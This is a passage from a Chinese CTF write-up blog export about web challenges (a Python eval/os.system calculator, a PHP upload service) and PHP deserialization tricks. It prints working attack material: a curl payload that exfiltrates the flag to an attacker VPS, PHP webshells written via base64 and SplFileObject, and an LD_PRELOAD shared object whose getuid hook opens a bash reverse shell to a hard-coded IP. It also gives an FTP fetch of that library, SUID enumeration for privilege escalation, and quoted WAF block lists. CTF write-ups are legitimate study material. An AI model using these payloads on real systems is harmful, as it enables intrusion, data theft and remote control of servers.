class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;class&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;args&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;from_pyfile&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;self&#x27;</span>, <span class="string">&#x27;item&#x27;</span>, <span class="string">&#x27;getitem&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;getattribute&#x27;</span>, <span class="string">&#x27;func_globals&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="string">&quot;欢迎来到SUctf2022&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>():</span></span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>, time.localtime()), ip, num)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p><strong>1.赛时</strong></p>
<p>waf过滤了很多关键词和符号，所以几乎不能用SSTI注入，<del>但是当时就想着肯定能用SSTI</del>，所以就一直卡住了（</p>
<p>然后因为之前做过类似的，利用报错进行模板注入，但是这道题利用<code>1/0#</code>这种形式也是完全过不了的，因为有js进行检测</p>
<p>然后就把目光放到了eval中，在想着该怎么传入num才使得eval或者system执行我们想要的代码，但是一直没有想到该怎么办</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>():</span></span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>, time.localtime()), ip, num)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br></pre></td></tr></table></figure>

<p><strong>2.赛后</strong></p>
<p>赛后看了<a href="https://blog.csdn.net/weixin_51458899/article/details/123782291?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-1.pc_relevant_paycolumn_v3&spm=1001.2101.3001.4242.2&utm_relevant_index=4">别的师傅</a>的wp</p>
<p>确实是从<code>os.system(log)</code>入手的，但是这里用到<code>#</code>是为了注释掉后面的内容，因为如果<code>eval(num)</code>出错的话，是不会进行下去的，导致实现不了rce</p>
<p><img src="https://img-blog.csdnimg.cn/a225b8cc4c674fe0809fe6974957923f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>而python又支持<code>#</code>与字符连接还是能当作注释符，而在unix中如果<code>#</code>与字符相邻则也会被当作字符，就可以利用这个区别直接构造payload</p>
<p>再利用反引号进行命令执行</p>
<p><img src="https://img-blog.csdnimg.cn/eeab61a3bc544fbe875c608f7ea37202.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>不过感觉可能是环境原因，直接用反引号没有返回值，直接用curl外带，payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/calc?num=1%23`curl%09http://vps:5656/?flag=\`cat%09Th1s*\``</span><br></pre></td></tr></table></figure>

<h4 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h4><ul>
<li>SplFileObject</li>
<li>利用环境变量getshell putenv</li>
<li>python搭建ftp服务</li>
<li>suid提权</li>
</ul>
<p><strong>1.赛时</strong></p>
<p>一看是文件上传，还只能上传php文件，那就直接看<code>phpinfo()</code>，然后就可以发现很多常用的函数被禁掉了，然后后来突然想到用FFI，但是一看，也被禁掉了</p>
<p><img src="https://img-blog.csdnimg.cn/096fe2b528874e2db312bd5aed3e89b7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>再后来尝试用原生类，我们在测试中可以发现<code>=|$|-|^</code>等字符也不可用， 那也几乎不可以用原生类，因为既然不能用<code>$</code>来赋值，那么只能直接new一个类来用<code>-&gt;</code>来调用方法，但是显而易见不可以，之后就直接摆了（🥺</p>
<p><strong>2.赛后</strong></p>
<p>① show_source没有被ban，但是会被过滤，可以利用php大小写不敏感绕过，获取<code>index.php</code>的源码，不仅过滤了函数还过滤了特殊字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;eval&quot;</span>,<span class="string">&quot;copy&quot;</span> ,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;usort&quot;</span>,<span class="string">&quot;include&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>,<span class="string">&quot;file&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwriter&quot;</span>,<span class="string">&quot;fput&quot;</span>,<span class="string">&quot;copy&quot;</span>,<span class="string">&quot;curl&quot;</span>,<span class="string">&quot;fread&quot;</span>,<span class="string">&quot;fget&quot;</span>,<span class="string">&quot;function_exists&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;proc_close&quot;</span>, <span class="string">&quot;proc_get_status&quot;</span>,<span class="string">&quot;checkdnsrr&quot;</span>,<span class="string">&quot;getmxrr&quot;</span>,<span class="string">&quot;getservbyname&quot;</span>,<span class="string">&quot;getservbyport&quot;</span>, <span class="string">&quot;syslog&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;highlight_file&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;chmod&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strstr(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//设置上传目录</span></span><br><span class="line">define(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;./uploads&quot;</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;Upload Success!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$ext</span> = pathinfo(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/php/i&quot;</span>, strtolower(<span class="variable">$ext</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;只要好看的php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="variable">$temp_file</span>);</span><br><span class="line"><span class="keyword">if</span>(fun(<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;诶，被我发现了吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$new_file_name</span> = md5(<span class="variable">$file_name</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$new_file_name</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;Upload Failed!&#x27;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;</span>.<span class="variable">$msg</span>.<span class="string">&quot; Look here~ &quot;</span>.<span class="variable">$img_path</span>.<span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>② 上传文件</p>
<h6 id="一些有用的知识"><a href="#一些有用的知识" class="headerlink" title="一些有用的知识"></a>一些有用的知识</h6><p>​    Ⅰ.可以利用base64+php伪协议包含文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//yuer.php</span></span><br><span class="line">PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+ <span class="comment">// <span class="meta">&lt;?php</span> eval($_POST[1]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">// yuer1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">Include</span>(base64_decode(<span class="string">&quot;cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPTJjYzAxMzkzMmVhZjJmY2IzODNmZGE3MzVmZWYwYTM2LnBocA==&quot;</span>)); <span class="comment">// php://filter/read=convert.base64-decode=xxx.php</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/dc1f4ea68a4141578c4dca57a89f3512.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>​        Ⅱ. 字符串拼接动态函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (<span class="string">&quot;fil&quot;</span>.<span class="string">&quot;e_get_contents&quot;</span>)(<span class="string">&quot;/var/www/html/index.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>​        Ⅲ. 原生类<strong>SplFileObject::fwrite</strong>写入文件</p>
<p>学到了新语法！！好耶！</p>
<p>重写一个类是为了实现把动态方法实现静态调用，因为动态调用的<code>-</code>被ban了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">define(<span class="string">&quot;F&quot;</span>, <span class="string">&quot;fil&quot;</span>.<span class="string">&quot;e_get_contents&quot;</span>); </span><br><span class="line">define(<span class="string">&quot;VALUE&quot;</span>,(F)(<span class="string">&quot;/var/www/html/index.php&quot;</span>)[<span class="number">353</span>]);</span><br><span class="line">define(<span class="string">&quot;E&quot;</span>, <span class="string">&quot;e&quot;</span>.<span class="string">&quot;val&quot;</span>);</span><br><span class="line">define(<span class="string">&quot;SHELL&quot;</span>,<span class="string">&quot;&lt;?php &quot;</span>.E.<span class="string">&quot;(&quot;</span>.VALUE.<span class="string">&quot;_POST[&#x27;a&#x27;]);?&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> (F)(<span class="string">&quot;./shell.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Splf</span> <span class="keyword">extends</span> <span class="title">SplFileObject</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="built_in">parent</span>::fwrite(SHELL);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">&quot;AMEUU&quot;</span>,<span class="keyword">new</span> Splf(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>③ bypass disable_functions</p>
<p>由于<code>putenv</code>没有被ban，可以通过修改<code>LD_PRELOAD</code>环境变量的值，可以执行我们上传的恶意os文件</p>
<p>exp：</p>
<p>因为putenv和mail都没有被ban，所以可以利用mail触发getuid反弹shell</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getuid</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>)==<span class="literal">NULL</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/82.156.2.166/3434 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC exp.c -o exp.so</span><br></pre></td></tr></table></figure>

<h6 id="另一些有用知识"><a href="#另一些有用知识" class="headerlink" title="另一些有用知识"></a>另一些有用知识</h6><p>​    Ⅰ. 用python搭建ftp服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m pyftpdlib -p 21</span><br></pre></td></tr></table></figure>

<p>​    Ⅱ. 将vps中的exp.so写进靶场中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$local_file</span> = <span class="string">&quot;/tmp/exp.so&quot;</span>;</span><br><span class="line"><span class="variable">$server_file</span> = <span class="string">&quot;exp.so&quot;</span>;</span><br><span class="line"><span class="variable">$vps</span> = <span class="string">&quot;82.156.2.166&quot;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="number">21</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ftp</span> = ftp_connect(<span class="variable">$vps</span>,<span class="variable">$port</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$login</span> = ftp_login(<span class="variable">$ftp</span>, <span class="string">&#x27;anonymous&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">ftp_pasv(<span class="variable">$ftp</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ftp_get(<span class="variable">$ftp</span>, <span class="variable">$local_file</span>,<span class="variable">$server_file</span>,FTP_BINARY))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;wrong&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ftp_close(<span class="variable">$ftp</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/177fbab174d5473397c10b2f4b6e9351.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>然后只要将<code>LD_PRELOAD</code>设置为exp.so所在的目录，然后执行mail函数触发getuid就好了，别忘了vps要监听</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">putenv(&quot;LD_PRELOAD=/tmp/exp.so&quot;);mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/59577ef792854b90bb33e5b1697243fa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h6 id="suid-提权"><a href="#suid-提权" class="headerlink" title="suid 提权"></a>suid 提权</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /bin -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find /usr -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>发现有权限使用nl</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nl /flag</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="https://erroratao.github.io/writeup/DASCTF2022xSU/">https://erroratao.github.io/writeup/DASCTF2022xSU/</a></p>
<p><a href="https://amiaaaz.github.io/2022/03/23/smth-about-env-variables/#bypass-disable_functions">https://amiaaaz.github.io/2022/03/23/smth-about-env-variables/#bypass-disable_functions</a></p>
]]></content>
      <categories>
        <category>参加的各种比赛</category>
      </categories>
      <tags>
        <tag>das</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化冷知识复现</title>
    <url>/2022/01/23/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%B7%E7%9F%A5%E8%AF%86%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="前提概要"><a href="#前提概要" class="headerlink" title="前提概要"></a>前提概要</h2><p><a href="https://zhuanlan.zhihu.com/p/405838002">https://zhuanlan.zhihu.com/p/405838002</a></p>
<p>之前比赛遇到的题目，根据师傅的回答复现一下</p>
<h2 id="PHP-Incomplete-Class"><a href="#PHP-Incomplete-Class" class="headerlink" title="__PHP_Incomplete_Class"></a>__PHP_Incomplete_Class</h2><p>当反序列化 <code>__PHP_Incomplete_Class</code>  这个类后，再对其进行序列化时，其属性会消失。</p>
<p><strong>0x01:</strong></p>
<p>首先<code>__PHP_Incomplete_Class</code>是当反序列化一个不存在的类时出现的类，而<code>__PHP_Incomplete_Class_Name</code>属性就是反序列化时不存在的类的类名：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// class A&#123;</span></span><br><span class="line"><span class="comment">//     public $test = &#x27;a&#x27;;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:1:&quot;a&quot;;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$a</span>));</span><br><span class="line">var_dump(serialize(unserialize(<span class="variable">$a</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">//object(__PHP_Incomplete_Class)#1 (2) &#123;</span></span><br><span class="line"><span class="comment">//  [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;   </span></span><br><span class="line"><span class="comment">//  string(1) &quot;A&quot;</span></span><br><span class="line"><span class="comment">//  [&quot;test&quot;]=&gt;</span></span><br><span class="line"><span class="comment">//  string(1) &quot;a&quot;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//string(31) &quot;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:1:&quot;a&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>而当再次反序列化的时候，内容并没有发生变化，这就说明了当序列化<code>__PHP_Incomplete_Class</code>时会先去查找属性<code>__PHP_Incomplete_Class_Name</code>的值，然后进行序列化为相对应的类</p>
<p>而我们可以根据该特点构造相对应的字符串，即构造存在<code>__PHP_Incomplete_Class</code>类但类中却不存在<code>__PHP_Incomplete_Class_Name</code>属性，当该字符串经过反序列化和序列化之后就会丢弃类里面的其他属性：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// class A&#123;</span></span><br><span class="line"><span class="comment">//     public $test = &#x27;a&#x27;;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:4:&quot;test&quot;;s:1:&quot;a&quot;;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$a</span>));</span><br><span class="line">var_dump(serialize(unserialize(<span class="variable">$a</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">//object(__PHP_Incomplete_Class)#1 (1) &#123;</span></span><br><span class="line"><span class="comment">//  [&quot;test&quot;]=&gt;</span></span><br><span class="line"><span class="comment">//  string(1) &quot;a&quot;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//string(34) &quot;O:22:&quot;__PHP_Incomplete_Class&quot;:0:&#123;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="n-3ctf-Ezunser"><a href="#n-3ctf-Ezunser" class="headerlink" title="n^3ctf_Ezunser"></a>n^3ctf_Ezunser</h3><p><a href="https://buuoj.cn/match/matches/68/challenges">题目</a></p>
<p>反序列化未定义的类</p>
<p>直接给了源码：</p>
<p><code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myAutoloader</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$classname</span>.<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pop</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    spl_autoload_register(<span class="string">&#x27;myAutoloader&#x27;</span>);</span><br><span class="line">    <span class="variable">$raw</span> = serialize(<span class="variable">$o</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/Evil/&quot;</span>,<span class="variable">$raw</span>))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Evil Classes!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pop</span>);</span><br><span class="line">    var_dump(<span class="variable">$o</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;EvillClass.php&quot;</span>;</span><br><span class="line">    highlight_file(<span class="string">&quot;EvilClass.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>0x01:</strong></p>
<p>先审计<code>index.php</code></p>
<p>第一个点在于<code>spl_autoload_register</code>，当调用<code>index.php</code>中没有定义的类的时候就会自动调用<code>myAutoloader($classname)</code>，其中<code>$classname</code>就是我们想实例化的类</p>
<p>想当然地我们想调用<code>EvilClass.php</code>里面的类，所以要<code>include EvilClass.php</code>，但是文件里还是没有定义<code>EvilClass</code>，这里就涉及到一个[php反序列的冷知识](<a href="https://zhuanlan.zhihu.com/p/405838002">PHP序列化冷知识 - 知乎 (zhihu.com)</a>)</p>
<p>我们还发现之后的if判断语句中ban掉了<code>Evil</code>，这就说明在序列化之后的字符串中不能再出现<code>EvilClass</code>，不过可以直接拿里面的payload</p>
<p>所以payload1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;i:0;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:3:&quot;qwb&quot;;O:9:&quot;EvilClass&quot;:0:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>……</p>
<h2 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast __destruct"></a>fast __destruct</h2><p>在__wakeup前触发 __destruct</p>
<blockquote>
<p>1、如果单独执行<code>unserialize</code>函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。<br>2、如果反序列化函数序列化出来的对象被赋给了程序中的变量，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量当中，当这个对象被销毁，才会执行其析构函数。</p>
</blockquote>
<p>而有时候我们如果提前执行<code>__destruct</code>(析构函数)就会绕过题目中某些限制,从而产生利用点,比如就可以bypass __wakeup(不过与php版本有关)</p>
<p>提前触发的方法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改属性个数值:</span><br><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;test&quot;;s:2:&quot;ls&quot;;&#125;</span><br><span class="line">去掉序列化尾部:</span><br><span class="line">O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:2:&quot;ls&quot;;</span><br></pre></td></tr></table></figure>

